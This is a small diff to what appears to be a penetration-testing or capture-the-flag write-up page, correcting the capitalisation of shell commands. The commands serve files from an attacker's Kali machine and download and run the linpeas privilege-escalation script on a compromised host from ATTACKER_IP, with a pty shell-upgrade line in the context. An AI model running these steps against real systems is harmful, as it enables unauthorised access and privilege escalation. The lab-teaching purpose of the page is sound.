@@ -243,15 +243,15 @@ python -c 'import pty; pty.spawn("/bin/bash")'
             <div class="terminal-block">
 <pre><code class="language-bash">
 On my kali box:
-Python3 -m http.server 8000
+python3 -m http.server 8000
 
 On user box:
-Cd /tmp
+cd /tmp
 
 Wget http://ATTACKER_IP:8000/linpeas.sh
 
 Making it executable:
-Chmod +x linpeas.sh
+chmod +x linpeas.sh
 
 Running it:
 ./linpeas.sh
